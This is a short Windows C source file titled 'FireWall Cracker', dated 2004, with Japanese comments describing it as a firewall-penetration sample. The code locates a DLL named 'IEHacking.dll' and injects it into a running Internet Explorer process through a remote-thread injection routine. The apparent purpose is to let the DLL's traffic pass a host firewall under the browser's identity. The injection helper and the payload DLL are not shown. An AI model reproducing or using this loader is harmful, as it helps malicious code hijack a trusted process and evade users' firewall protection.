//==========================================================
//		FireWall Cracker
//		ただのファイアウォール貫通サンプルです。
//
//		2004/08/19 by kimoto
//==========================================================
#include <windows.h>
#include "inject.h"

//==========================================================
//	マクロの宣言
//==========================================================
#define WINDOW_NAME "FireWall Cracker"
#define CLASS_NAME	"FireWall Cracker"

#define DLL_FILE_NAME "IEHacking.dll"
#define TARGET_PROCESS "IEXPLORE.EXE"
//==========================================================
//	関数のプロトタイプの宣言
//==========================================================
LRESULT CALLBACK WndProc(HWND,UINT,WPARAM,LPARAM);

//==========================================================
//	メインの関数
//==========================================================
BOOL WINAPI WinMain(HINSTANCE hInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpCmdLine,
					int nShowCmd)
{
	TCHAR szDLLPath[MAX_PATH];

	//注入したいDLLのフルパスを取得
	GetModuleFileName( NULL, szDLLPath, sizeof( szDLLPath ) );
	lstrcpy( ( strrchr( szDLLPath, '\\' ) + 1 ), DLL_FILE_NAME );
	
	//とりあえず、本当にDLLが存在するか調べる
	HMODULE hDLL;
	hDLL = LoadLibraryEx(
		szDLLPath,
		NULL,
		LOAD_LIBRARY_AS_DATAFILE);
	if(hDLL == NULL){

		MessageBox(
			NULL,
			"DLLが同じディレクトリに見つかりません。",
			"確認",
			MB_ICONEXCLAMATION);
		
		return -1;
	}

	if(InjectToProcess(szDLLPath,TARGET_PROCESS) == FALSE){

		MessageBox(
			NULL,
			"DLLの注入に失敗しました。\n"
			"InternetExplorerが起動しているか確認してください。\n"
			"また、CreateRemoteThread関数を使用しているので\n"
			"このプログラムは、WindowsNT系専用です。",
			"確認",
			MB_ICONEXCLAMATION);

	}

	return TRUE;

}